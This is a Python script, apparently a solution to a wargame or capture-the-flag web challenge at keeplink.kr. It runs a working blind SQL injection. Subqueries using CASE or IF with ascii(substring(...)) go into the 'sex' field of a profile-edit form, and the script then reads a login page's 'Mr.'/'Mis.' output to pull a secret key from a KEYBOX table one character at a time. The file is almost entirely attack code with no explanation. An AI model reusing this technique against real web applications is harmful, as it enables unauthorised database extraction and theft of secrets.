import requests
from bs4 import BeautifulSoup

def find_string(result_list, num):
    if num == 1:
    	string = 'Mr.'
    elif num == 2:
    	string = 'Mis.'

    for i in result_list:
        if string in i:
            return i

def str_to_num(abc):
    num = 0
    a = [ord(i) for i in abc]
    for i in a:
        num = (num<<8)+i
    return num

def num_to_str(num):
    a=''
    while(num!=0):
        a+=chr(num &0xff)
        num = num>>8
    a=a[::-1]
    return a

def DEBUG():
	edit_url = 'http://keeplink.kr:10105/web_basic_edit_ok.php'
	login_url = 'http://keeplink.kr:10105/web_basic_ok.php'
	login_data = {'id' : 'admin 123123', 'pw' : 'test'}
	key = ''

	i = 1
	abc = 66
	query = '(select case when (ascii(substring((select k3y from KEYBOX limit 1),'+str(i)+',1)))='+str(abc)+' then 1 else 2 end)'
	edit_data = {'id' : 'admin 123123', 'pw' : 'test', 'pwch' : 'test', 'age' : '200', 'sex' : query, 'email' : 'test@test.com'}
	response = requests.post(edit_url, data=edit_data)
	print('====response=====\n',response)
	print(query)

	response = requests.post(login_url, data=login_data)
	soup = BeautifulSoup(response.text, 'html.parser')
	result = soup.prettify()
	result_list = result.split('\n')
	mr = find_string(result_list,1)
	print('MR : ',mr)
	ms = find_string(result_list,2)
	print('MR : ',ms)
	print(soup)


def select_if_exploit():
	edit_url = 'http://keeplink.kr:10105/web_basic_edit_ok.php'
	login_url = 'http://keeplink.kr:10105/web_basic_ok.php'
	login_data = {'id' : 'admin 123123', 'pw' : 'test'}
	key = ''
	
	# key length
	for i in range(1,25):
		# print('DEBUG [i] : ',i)

		# ascii '!' to 'z'
		for abc in range(32,123):
			# print('ascii : ',abc)
			query = '(select if(ascii(substring((select k3y from KEYBOX limit 1),'+str(i)+',1))='+str(abc)+',1,2))'
			edit_data = {'id' : 'admin 123123', 'pw' : 'test', 'pwch' : 'test', 'age' : '200', 'sex' : query, 'email' : 'test@test.com'}
			response = requests.post(edit_url, data=edit_data)

			response = requests.post(login_url, data=login_data)
			soup = BeautifulSoup(response.text, 'html.parser')
			result = soup.prettify()
			result_list = result.split('\n')
			result = find_string(result_list,1)

			if result == '     &gt;&gt; Mr.admin 123123 &lt;&lt;':
				print("[======TRUE!=====] ","[",str(i),"]","[",str(num_to_str(abc)),"]",result)
				key += str(num_to_str(abc))
				print('key : [',i,']',key)
				break

	print('[+]=========[RESULT KEY]=========[+]')
	print('KEY : ',key)


def exploit():
	edit_url = 'http://keeplink.kr:10105/web_basic_edit_ok.php'
	login_url = 'http://keeplink.kr:10105/web_basic_ok.php'
	login_data = {'id' : 'admin 123123', 'pw' : 'test'}
	key = ''

	# key length
	for i in range(1,25):
		# print('DEBUG [i] : ',i)

		# ascii '!' to 'z'
		for abc in range(32,123):
			# print('ascii : ',abc)
			query = '(select case when (ascii(substring((select k3y from KEYBOX limit 1),'+str(i)+',1)))='+str(abc)+' then 1 else 2 end)'
			edit_data = {'id' : 'admin 123123', 'pw' : 'test', 'pwch' : 'test', 'age' : '200', 'sex' : query, 'email' : 'test@test.com'}
			response = requests.post(edit_url, data=edit_data)

			response = requests.post(login_url, data=login_data)
			soup = BeautifulSoup(response.text, 'html.parser')
			result = soup.prettify()
			result_list = result.split('\n')
			
			result = find_string(result_list,1)

			if result == '     &gt;&gt; Mr.admin 123123 &lt;&lt;':
				print("[======TRUE!=====] ","[",str(i),"]","[",str(num_to_str(abc)),"]",result)
				key += str(num_to_str(abc))
				print('key : [',i,']',key)
				break

	print('[+]=========[RESULT KEY]=========[+]')
	print('KEY : ',key)


if __name__ == "__main__":
	# select_if_exploit()
	exploit()
	# DEBUG()
